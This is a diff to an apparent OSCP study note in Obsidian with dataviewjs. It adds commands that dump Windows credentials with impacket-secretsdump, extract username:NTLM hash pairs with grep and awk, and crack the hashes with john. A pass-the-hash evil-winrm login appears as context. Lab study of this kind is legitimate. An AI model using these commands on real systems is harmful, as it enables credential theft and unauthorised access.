@@ -100,10 +100,15 @@ const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `impacket-secretsdump ${discoveredDomain}/Retric:pass123@${ip}`;
+const command = `impacket-secretsdump ${discoveredDomain}/Retric:pass123@${ip} > secretsdump_output.txt`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Cleanse the data to username:ntlm hash
+```
+grep -E ':[0-9]+:' secretsdump_output.txt | awk -F ':' '{print $1":"$4}' > ntlm_hashes.txt
+```
+
 Login with WinRM using 2nd portion of hash
 
 ```
@@ -122,5 +127,24 @@ const command = `evil-winrm -i ${ip} -u administrator -H ${hash}`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Crack if needed 
 
+This is the hash.txt format
+```dataviewjs
+const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
+const hash = pagea?.["hash"] ?? "NO HASH FOUND";
+
+
+```
+```dataviewjs
+const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
+const hash = pagea?.["hash"] ?? "NO HASH FOUND";
+
+const command = `echo Administrator:${hash} > hash.txt`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
